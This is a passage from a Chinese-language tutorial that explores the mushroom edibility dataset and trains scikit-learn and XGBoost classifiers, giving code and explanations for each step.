<p><strong>单变量分析（Unvariate Analisys）：</strong></p>
<ol>
<li><strong><code>cap-shape</code></strong> - 数据集中的大多数蘑菇都有凸形（45%）或平坦（38.8%）的帽子。</li>
<li><strong><code>cap-surface</code></strong> - 最常见的帽子表面是鳞状的（39.93%），几乎没有沟槽（0.05%）。</li>
<li><strong><code>cap-color</code></strong> - 数据集中超过一半的蘑菇有棕色（28.11%）或灰色（22.65%）的帽子颜色，我们还有8种其他颜色出现的频率较低。</li>
<li><strong><code>bruises</code></strong> - 数据集中的大多数蘑菇都没有瘀伤（58.44%）。</li>
<li><strong><code>odor</code></strong> - 最常见的气味（超过70%）要么没有气味（43.43%），要么有恶臭（26.59%）。</li>
<li><strong><code>gill-attachment</code></strong> - 我们的数据中几乎所有的蘑菇都有自由的菌褶附着（约97.5%），所以这一列在我们的分析中几乎是无用的。</li>
<li><strong><code>gill-spacing</code></strong> - 我们数据集中超过85%的蘑菇有紧密的菌褶间距，所以它在我们的分析中几乎没有影响。</li>
<li><strong><code>gill-size</code></strong> - 我们数据集中的大多数蘑菇有宽的（69.08%）菌褶大小，其他的是窄的。</li>
<li><strong><code>gill-color</code></strong> - 我们数据集中超过一半的蘑菇有浅黄色（21.27%）、粉红色（18.37%）或白色（22.65%）的菌褶颜色，我们还有9种其他颜色出现的频率较低。</li>
<li><strong><code>stalk-shape</code></strong> - 我们数据集中的大多数蘑菇有锥形的（56.72%），其他的是扩大的。</li>
<li><strong><code>stalk-root</code></strong> - 最常见的柄根（超过75%）要么是球状的（46.48%）要么是丝状的（30.53%）。</li>
<li><strong><code>stalk-surface-above-ring</code></strong> - 最常见的环上柄表面（超过90%）要么是光滑的（63.71%）要么是丝状的（29.2%）。</li>
<li><strong><code>stalk-surface-below-ring</code></strong> - 最常见的环下柄表面（几乎90%）要么是光滑的（60.76%）要么是丝状的（28.36%），与<code>stalk-surface-above-ring</code>几乎没有区别。</li>
<li><strong><code>stalk-color-above-ring</code></strong> - 我们数据集中超过一半的蘑菇有白色（54.95%）的柄颜色，我们还有8种其他颜色出现的频率较低。</li>
<li><strong><code>stalk-color-below-ring</code></strong> - 我们数据集中超过一半的蘑菇有白色（53.96%）的柄颜色，我们还有8种其他颜色出现的频率较低，与<code>stalk-color-above-ring</code>几乎没有区别。</li>
<li><strong><code>veil-type</code></strong> - 所有蘑菇的面纱类型都是部分的，所以这一列在我们的分析中几乎是无用的。</li>
<li><strong><code>veil-color</code></strong> - 几乎所有的蘑菇面纱颜色都是白色（97.54%），所以这一列在我们的分析中几乎是无用的。</li>
<li><strong><code>ring-number</code></strong> - 几乎所有的蘑菇环数都是一个（92.17%），所以这一列在我们的分析中几乎是无用的。</li>
<li><strong><code>ring-type</code></strong> - 我们数据集中超过98%的蘑菇有吊坠（48.84%）、短暂的（34.17%）或大的（15.95%）环类型。</li>
<li><strong><code>spore-print-color</code></strong> - 最常见的颜色是白色（29.39%）、棕色（24.22%）、黑色（23.04%）和巧克力色（20.09%），其他颜色不重要。</li>
<li><strong><code>population</code></strong> - 最常见的种群（超过70%）要么是多个（49.73%）要么是孤立的（21.07%）。</li>
<li><strong><code>habitat</code></strong> - 最常见的栖息地（超过65%）要么是森林（38.75%）要么是草地（26.44%）。</li>
</ol>
<h5 id="Multivariate-Plots"><a href="#Multivariate-Plots" class="headerlink" title="Multivariate Plots"></a>Multivariate Plots</h5><p><strong>Multivariate Plots</strong>: 多变量图是一种数据可视化技术，用于显示两个或更多变量之间的关系。这可以包括散点图、相关矩阵、平行坐标图等。这些图可以帮助你理解变量之间的关系，例如它们是否有相关性或是否存在任何群集或异常值。</p>
<p>在本处，将对每个属性，结合目标类别（p，e）进行绘制柱状图。</p>
<p>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> M_cols[<span class="number">1</span>:]: </span><br><span class="line">    plt.figure(figsize=(<span class="number">30</span>,<span class="number">20</span>))</span><br><span class="line">    plt.subplot(<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">    sns.countplot(x=col ,hue=<span class="string">&#x27;class&#x27;</span>, data=Mushroom_df ,palette=<span class="string">&#x27;viridis_r&#x27;</span>)</span><br><span class="line">    plt.xlabel(col, fontsize=<span class="number">20</span>)</span><br><span class="line">    plt.legend(loc=<span class="string">&#x27;upper left&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li><code>for col in M_cols[1:]: ...</code>: 这个循环对 <code>M_cols</code> 列表中的每个元素（除了第一个元素）执行以下操作。</li>
<li><code>plt.figure(figsize=(30,20))</code>: 这行代码设置了图形的大小。</li>
<li><code>plt.subplot(2,3,1)</code>: 这行代码创建了一个子图，它是一个2行3列的网格中的第一个图。</li>
<li><code>sns.countplot(x=col ,hue=&#39;class&#39;, data=Mushroom_df ,palette=&#39;viridis_r&#39;)</code>: 这行代码创建了一个 countplot，显示了给定特征的每个类别的实例数量，并使用颜色来区分目标变量的类别。</li>
<li><code>plt.xlabel(col, fontsize=20)</code>: 这行代码设置了图形的 x 轴标签和字体大小。</li>
<li><code>plt.legend(loc=&#39;upper left&#39;)</code>: 这行代码添加了一个图例，并设置了它的位置。</li>
</ol>
<p>上述代码创建了一系列的多变量条形图，显示每个特征与目标变量之间的关系，以下列出部分输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042128145.png" alt="image.png"></p>
<p>特征与目标变量关系的分析<br>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ pd.pivot_table(Mushroom_df, index=[col,<span class="string">&quot;class&quot;</span>], aggfunc = &#123;col:np.count_nonzero&#125;) <span class="keyword">for</span> col <span class="keyword">in</span> M_cols[<span class="number">1</span>:]]</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li><code>for col in M_cols[1:]: ...</code>: 这个循环对 <code>M_cols</code> 列表中的每个元素（除了第一个元素）执行以下操作。</li>
<li><code>pd.pivot_table(Mushroom_df, index=[col,&quot;class&quot;], aggfunc = &#123;col:np.count_nonzero&#125;)</code>: 这行代码创建了一个透视表，其中行索引是给定特征和目标变量的类别，聚合函数是非零计数。</li>
</ol>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042133492.png" alt="image.png"></p>
<p><strong>特征与目标变量分析（Multivariate Analisys）：</strong></p>
<ol>
<li><strong><code>cap-shape</code></strong> - 我们数据集中的大多数<strong>瘤状</strong>蘑菇都是有毒的。</li>
<li><strong><code>cap-surface</code></strong> - 大多数<strong>纤维状</strong>帽面的蘑菇是可食用的。</li>
<li><strong><code>cap-color</code></strong> - 大多数<strong>白色</strong>帽子的蘑菇是可食用的，而大多数<strong>黄色</strong>帽子的蘑菇是有毒的。</li>
<li><strong><code>bruises</code></strong> - <strong>有瘀伤</strong>的蘑菇通常是可食用的，而<strong>无瘀伤</strong>的蘑菇通常是相反的。</li>
<li><strong><code>odor</code></strong> - <strong>无气味</strong>的蘑菇大多是可食用的，而所有<strong>恶臭</strong>的蘑菇都是有毒的。</li>
<li><strong><code>gill-attachment</code></strong> - <strong>附着</strong>的菌褶几乎总是可食用的。</li>
<li><strong><code>gill-spacing</code></strong> - <strong>密集</strong>的菌褶几乎总是可食用的。</li>
<li><strong><code>gill-size</code></strong> - <strong>窄</strong>的菌褶大小的蘑菇几乎总是有毒的。</li>
<li><strong><code>gill-color</code></strong> - <strong>浅黄色</strong>菌褶颜色的蘑菇总是有毒的。</li>
<li><strong><code>stalk-shape</code></strong> - 在有毒或可食用方面，每个值之间的差异不大。</li>
<li><strong><code>stalk-root</code></strong> - 通常，柄根数据缺失的蘑菇通常是有毒的。</li>
<li><strong><code>stalk-surface-above-ring</code></strong> - 通常，<strong>丝状</strong>的蘑菇是有毒的，<strong>光滑</strong>的通常是可食用的。</li>
<li><strong><code>stalk-surface-below-ring</code></strong> - 与<code>stalk-surface-above-ring</code>大致相同。</li>
<li><strong><code>stalk-color-above-ring</code></strong> - 通常，<strong>白色</strong>柄色的蘑菇是可食用的，粉红色的大多数是有毒的。</li>
<li><strong><code>stalk-color-below-ring</code></strong> - 与<code>stalk-color-above-ring</code>大致相同。</li>
<li><strong><code>veil-type</code></strong> - 所有蘑菇的面纱类型都是部分的，所以这一列在我们的分析中几乎是无用的。</li>
<li><strong><code>veil-color</code></strong> - 几乎所有的蘑菇面纱颜色都是**白色 (97.54%)**，所以这一列在我们的分析中几乎是无用的。</li>
<li><strong><code>ring-number</code></strong> - 几乎所有的蘑菇环数都是**一个 (92.17%)**，所以这一列在我们的分析中几乎是无用的。</li>
<li><strong><code>ring-type</code></strong> - <strong>吊坠</strong>环型的蘑菇大多是可食用的，<strong>短暂</strong>的大多是有毒的，<strong>大</strong>环型的都是有毒的。</li>
<li><strong><code>spore-print-color</code></strong> - <strong>棕色</strong>和<strong>黑色</strong>的几乎完全是可食用的，而<strong>白色</strong>和**巧克力色 (20.09%)**的大多数是有毒的。</li>
<li><strong><code>population</code></strong> - 通常，<strong>多个</strong>种群的蘑菇大多是有毒的。</li>
<li><strong><code>habitat</code></strong> - 在<strong>森林</strong>或<strong>草地</strong>生长的蘑菇大多是可食用的。</li>
</ol>
<h4 id="2-7-特征工程"><a href="#2-7-特征工程" class="headerlink" title="2.7 特征工程"></a>2.7 特征工程</h4><p>根据以上分析，不需要以下列，因此将删除它们：“鳃附着”、“茎形状”、“环下茎表面”、“圈下茎颜色”、“面纱类型”、“纱颜色”、”环编号“。<br>所以现在将创建新的特征变量X，不包括上述列：</p>
<p>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Del_cols = [<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;gill-attachment&#x27;</span>, <span class="string">&#x27;stalk-shape&#x27;</span>, <span class="string">&#x27;stalk-surface-below-ring&#x27;</span>, <span class="string">&#x27;stalk-color-below-ring&#x27;</span>, <span class="string">&#x27;veil-type&#x27;</span>, <span class="string">&#x27;veil-color&#x27;</span>, <span class="string">&#x27;ring-number&#x27;</span>] </span><br><span class="line">X =Mushroom_df.copy()</span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> Del_cols:</span><br><span class="line">    X = X.drop(col, axis = <span class="number">1</span>)</span><br><span class="line">X=pd.get_dummies(X,columns=X.columns,drop_first=<span class="literal">True</span>)</span><br><span class="line">X.head(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042141037.png" alt="image.png"></p>
<p>创建目标变量y，并将其转换为相应格式（0、1）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">y = Mushroom_df[<span class="string">&#x27;class&#x27;</span>]</span><br><span class="line">Encoder_y=LabelEncoder()</span><br><span class="line">y = Encoder_y.fit_transform(y)</span><br><span class="line">y</span><br></pre></td></tr></table></figure>
<p>输出：<br><code>array([1, 0, 0, ..., 0, 1, 0])</code></p>
<h3 id="3-机器学习模型"><a href="#3-机器学习模型" class="headerlink" title="3. 机器学习模型"></a>3. 机器学习模型</h3><p><strong>前言：</strong><br>将“X”作为特征，将“y”作为“类”——想要预测的目标值。<br>这是一个分类问题，所以使用分类的方法。<br>训练集和测试集的遍历为75:25</p>
<p><strong>将使用的模型：</strong><br>逻辑回归（Logistic Regression）<br>决策树分类器（Decision Tree Classifier）<br>随机森林回归器（Random Forest Regressor）<br>XGBoost分类器（XGBoost Classifier）<br>支持向量机（Support Vector Machines）</p>
<p><strong>数据建模过程</strong>：<br>1.导入模型2.训练模型3.预测4.分类指标评估</p>
<p><strong>分类评分指标：</strong><br><em><strong>准确度：</strong></em><br>$$Accuracy&#x3D;\frac{TP+TN}{TP+TN+FP+FN}$$</p>
<p><strong>精确性：</strong><br>$$Precision&#x3D;\frac{TP}{TP+FP}$$<br><strong>召回度：</strong><br>$$Recall&#x3D;\frac{TP}{TP+FN}$$<br><strong>f1分数：</strong>-介于0和1之间的数字，即精度和查全率的调和平均值。<br>$$F_1&#x3D;2<em>\frac{precision</em>recall}{precison+recall}$$</p>
<h4 id="3-1-划分数据集"><a href="#3-1-划分数据集" class="headerlink" title="3.1 划分数据集"></a>3.1 划分数据集</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = <span class="number">0.75</span>, random_state = <span class="number">101</span>)</span><br></pre></td></tr></table></figure>

<p>为了提高评估方法的准确性，需要使用交叉验证方法，对每个模型使用该方法，并构建一个分类报告，用于对模型的最终排名进行排名和确定。<br>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cross_val</span>(<span class="params">model_name,model,X,y,cv</span>):</span><br><span class="line">    </span><br><span class="line">    scores = CVS(model, X, y, cv=cv)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;model_name&#125;</span> Scores:&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> scores:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">round</span>(i,<span class="number">2</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Average <span class="subst">&#123;model_name&#125;</span> score: <span class="subst">&#123;<span class="built_in">round</span>(scores.mean(),<span class="number">4</span>)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">index = [<span class="string">&#x27;Valid1&#x27;</span>,<span class="string">&#x27;Valid2&#x27;</span>,<span class="string">&#x27;Valid3&#x27;</span>,<span class="string">&#x27;Valid4&#x27;</span>,<span class="string">&#x27;Valid5&#x27;</span>]</span><br><span class="line">scoring = [<span class="string">&#x27;accuracy&#x27;</span>,<span class="string">&#x27;precision&#x27;</span>, <span class="string">&#x27;recall&#x27;</span>,<span class="string">&#x27;f1&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h4 id="3-2-逻辑回归（Logistic-Regression）"><a href="#3-2-逻辑回归（Logistic-Regression）" class="headerlink" title="3.2 逻辑回归（Logistic Regression）"></a>3.2 逻辑回归（Logistic Regression）</h4><p>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#model</span></span><br><span class="line">LR = LogisticRegression()</span><br><span class="line"><span class="comment">#cross validation</span></span><br><span class="line">LR_report = pd.DataFrame(cross_validate(LR, X, y, scoring=scoring))</span><br><span class="line"><span class="comment">#getting required score methods</span></span><br><span class="line">LR_report = LR_report.iloc[:,<span class="number">2</span>:]</span><br><span class="line"><span class="comment">#naming the columns</span></span><br><span class="line">LR_report.columns = scoring</span><br><span class="line"><span class="comment">#naming the index</span></span><br><span class="line">LR_report.index = index</span><br><span class="line"></span><br><span class="line"><span class="comment">#final result collection</span></span><br><span class="line">model_1 = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#Classification report</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Clasification report:\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(LR_report,<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Mean Scores:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> score <span class="keyword">in</span> scoring:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\t<span class="subst">&#123;score&#125;</span>: <span class="subst">&#123;<span class="built_in">round</span>(LR_report[score].mean(),<span class="number">4</span>)&#125;</span>&quot;</span>)</span><br><span class="line">    model_1.append(<span class="built_in">round</span>(LR_report[score].mean(),<span class="number">4</span>))</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li><code>LR = LogisticRegression()</code>: 创建一个逻辑回归模型的实例。</li>
<li><code>LR_report = pd.DataFrame(cross_validate(LR, X, y, scoring=scoring))</code>: 使用交叉验证来评估模型的性能。<code>cross_validate</code> 函数返回一个字典，其中包含每次交叉验证的结果。这个字典被转换成一个 DataFrame。</li>
<li><code>LR_report = LR_report.iloc[:,2:]</code>: 选择DataFrame 中的一部分列。</li>
<li><code>LR_report.columns = scoring</code> 和 <code>LR_report.index = index</code>: 设置了DataFrame 的列名和行名。</li>
<li><code>model_1 = []</code>: 创建一个空列表，用于收集模型的平均分数。</li>
<li>最后，打印每个评分指标的结果，并计算它们的平均值。这些平均值被添加到了 <code>model_1</code> 列表中。</li>
</ol>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042305650.png" alt="image.png"></p>
<p>预测结果保存：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample prediction for csv file</span></span><br><span class="line">LR.fit(X_train, y_train)<span class="comment">#training</span></span><br><span class="line">y_predict = LR.predict(X_test)<span class="comment">#predicting</span></span><br><span class="line">Logistic_Regression=pd.DataFrame(&#123;<span class="string">&#x27;y_test&#x27;</span>:y_test,<span class="string">&#x27;prediction&#x27;</span>:y_predict&#125;)<span class="comment">#df for camparison</span></span><br><span class="line">Logistic_Regression.to_csv(<span class="string">&quot;Logistic Regression.csv&quot;</span>)<span class="comment">#export to csv     </span></span><br></pre></td></tr></table></figure>



<h4 id="3-3-决策树分类器（Decision-Tree-Classifier）"><a href="#3-3-决策树分类器（Decision-Tree-Classifier）" class="headerlink" title="3.3 决策树分类器（Decision Tree Classifier）"></a>3.3 决策树分类器（Decision Tree Classifier）</h4><p>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#model</span></span><br><span class="line">DT = DecisionTreeClassifier()</span><br><span class="line"><span class="comment">#cross validation</span></span><br><span class="line">DT_report = pd.DataFrame(cross_validate(DT, X, y, scoring=scoring))</span><br><span class="line"><span class="comment">#getting required score methods</span></span><br><span class="line">DT_report = DT_report.iloc[:,<span class="number">2</span>:]</span><br><span class="line"><span class="comment">#naming the columns</span></span><br><span class="line">DT_report.columns = scoring</span><br><span class="line"><span class="comment">#naming the index</span></span><br><span class="line">DT_report.index = index</span><br><span class="line"></span><br><span class="line"><span class="comment">#final result collection</span></span><br><span class="line">model_2 = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#Classification report</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Clasification report:\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(DT_report,<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Mean Scores:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> score <span class="keyword">in</span> scoring:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\t<span class="subst">&#123;score&#125;</span>: <span class="subst">&#123;<span class="built_in">round</span>(DT_report[score].mean(),<span class="number">4</span>)&#125;</span>&quot;</span>)</span><br><span class="line">    model_2.append(<span class="built_in">round</span>(DT_report[score].mean(),<span class="number">4</span>))</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li><code>DT = DecisionTreeClassifier()</code>: 创建一个决策树分类器的实例。</li>
<li><code>DT_report = pd.DataFrame(cross_validate(DT, X, y, scoring=scoring))</code>: 使用交叉验证来评估模型的性能。<code>cross_validate</code> 函数返回一个字典，其中包含了每次交叉验证的结果。这个字典被转换成一个 DataFrame。</li>
<li><code>DT_report = DT_report.iloc[:,2:]</code>: 选择 DataFrame 中的一部分列。</li>
<li><code>DT_report.columns = scoring</code> 和 <code>DT_report.index = index</code>: 设置 DataFrame 的列名和行名。</li>
<li><code>model_2 = []</code>: 创建一个空列表，用于收集模型的平均分数。</li>
<li>最后，打印每个评分指标的结果，并计算它们的平均值。这些平均值被添加到了 <code>model_2</code> 列表中。</li>
</ol>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042313374.png" alt="image.png"></p>
<p>预测结果保存：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample prediction for csv file</span></span><br><span class="line">DT.fit(X_train, y_train)<span class="comment">#training</span></span><br><span class="line">y_predict = DT.predict(X_test)<span class="comment">#predicting</span></span><br><span class="line">Decision_Tree=pd.DataFrame(&#123;<span class="string">&#x27;y_test&#x27;</span>:y_test,<span class="string">&#x27;prediction&#x27;</span>:y_predict&#125;)<span class="comment">#df for camparison</span></span><br><span class="line">Decision_Tree.to_csv(<span class="string">&quot;Decision Tree.csv&quot;</span>)<span class="comment">#export to csv     </span></span><br></pre></td></tr></table></figure>


<h4 id="3-4-随机森林回归器（Random-Forest-Regressor）"><a href="#3-4-随机森林回归器（Random-Forest-Regressor）" class="headerlink" title="3.4 随机森林回归器（Random Forest Regressor）"></a>3.4 随机森林回归器（Random Forest Regressor）</h4><p>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#model</span></span><br><span class="line">RF = RandomForestClassifier()</span><br><span class="line"><span class="comment">#cross validation</span></span><br><span class="line">RF_report = pd.DataFrame(cross_validate(RF, X, y, scoring=scoring))</span><br><span class="line"><span class="comment">#getting required score methods</span></span><br><span class="line">RF_report = RF_report.iloc[:,<span class="number">2</span>:]</span><br><span class="line"><span class="comment">#naming the columns</span></span><br><span class="line">RF_report.columns = scoring</span><br><span class="line"><span class="comment">#naming the index</span></span><br><span class="line">RF_report.index = index</span><br><span class="line"></span><br><span class="line"><span class="comment">#final result collection</span></span><br><span class="line">model_3 = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#Classification report</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Clasification report:\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(RF_report,<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Mean Scores:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> score <span class="keyword">in</span> scoring:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\t<span class="subst">&#123;score&#125;</span>: <span class="subst">&#123;<span class="built_in">round</span>(RF_report[score].mean(),<span class="number">4</span>)&#125;</span>&quot;</span>)</span><br><span class="line">    model_3.append(<span class="built_in">round</span>(RF_report[score].mean(),<span class="number">4</span>))</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li><code>RF = RandomForestClassifier()</code>: 创建一个随机森林分类器的实例。</li>
<li><code>RF_report = pd.DataFrame(cross_validate(RF, X, y, scoring=scoring))</code>: 使用交叉验证来评估模型的性能。<code>cross_validate</code> 函数返回一个字典，其中包含每次交叉验证的结果。这个字典被转换成一个 DataFrame。</li>
<li><code>RF_report = RF_report.iloc[:,2:]</code>: 选择 DataFrame 中的一部分列。 </li>
<li><code>RF_report.columns = scoring</code> 和 <code>RF_report.index = index</code>: 设置DataFrame 的列名和行名。</li>
<li><code>model_3 = []</code>: 创建一个空列表，用于收集模型的平均分数。</li>
<li>最后，这段代码打印每个评分指标的结果，并计算它们的平均值。这些平均值被添加到了 <code>model_3</code>列表中。</li>
</ol>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042314553.png" alt="image.png"></p>
<p>预测结果保存：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample prediction for csv file</span></span><br><span class="line">RF.fit(X_train, y_train)<span class="comment">#training</span></span><br><span class="line">y_predict = RF.predict(X_test)<span class="comment">#predicting</span></span><br><span class="line">Random_Forest = pd.DataFrame(&#123;<span class="string">&#x27;y_test&#x27;</span>:y_test,<span class="string">&#x27;prediction&#x27;</span>:y_predict&#125;)<span class="comment">#df for camparison</span></span><br><span class="line">Random_Forest.to_csv(<span class="string">&quot;Random Forest.csv&quot;</span>)<span class="comment">#export to csv     </span></span><br></pre></td></tr></table></figure>

<h4 id="3-5-XGBoost分类器（XGBoost-Classifier）"><a href="#3-5-XGBoost分类器（XGBoost-Classifier）" class="headerlink" title="3.5 XGBoost分类器（XGBoost Classifier）"></a>3.5 XGBoost分类器（XGBoost Classifier）</h4><p>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#model</span></span><br><span class="line">XGB = XGBClassifier()</span><br><span class="line"><span class="comment">#cross validation</span></span><br><span class="line">XGB_report = pd.DataFrame(cross_validate(XGB, X, y, scoring=scoring))</span><br><span class="line"><span class="comment">#getting required score methods</span></span><br><span class="line">XGB_report = XGB_report.iloc[:,<span class="number">2</span>:]</span><br><span class="line"><span class="comment">#naming the columns</span></span><br><span class="line">XGB_report.columns = scoring</span><br><span class="line"><span class="comment">#naming the index</span></span><br><span class="line">XGB_report.index = index</span><br><span class="line"></span><br><span class="line"><span class="comment">#final result collection</span></span><br><span class="line">model_4 = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#Classification report</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Clasification report:\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(XGB_report,<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Mean Scores:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> score <span class="keyword">in</span> scoring:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\t<span class="subst">&#123;score&#125;</span>: <span class="subst">&#123;<span class="built_in">round</span>(XGB_report[score].mean(),<span class="number">4</span>)&#125;</span>&quot;</span>)</span><br><span class="line">    model_4.append(<span class="built_in">round</span>(XGB_report[score].mean(),<span class="number">4</span>))</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li><code>XGB = XGBClassifier()</code>: 创建一个XGBoost分类器的实例。</li>
<li><code>XGB_report = pd.DataFrame(cross_validate(XGB, X, y, scoring=scoring))</code>: 使用交叉验证来评估模型的性能。<code>cross_validate</code> 函数返回一个字典，其中包含每次交叉验证的结果。这个字典被转换成一个 DataFrame。</li>
<li><code>XGB_report = XGB_report.iloc[:,2:]</code>:选择 DataFrame 中的一部分列。</li>
<li><code>XGB_report.columns = scoring</code> 和 <code>XGB_report.index = index</code>: 设置DataFrame 的列名和行名。</li>
<li><code>model_4 = []</code>: 创建一个空列表，用于收集模型的平均分数。</li>
<li>最后，这段代码打印每个评分指标的结果，并计算它们的平均值。这些平均值被添加到了 <code>model_4</code> 列表中。</li>
</ol>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042319590.png" alt="image.png"></p>
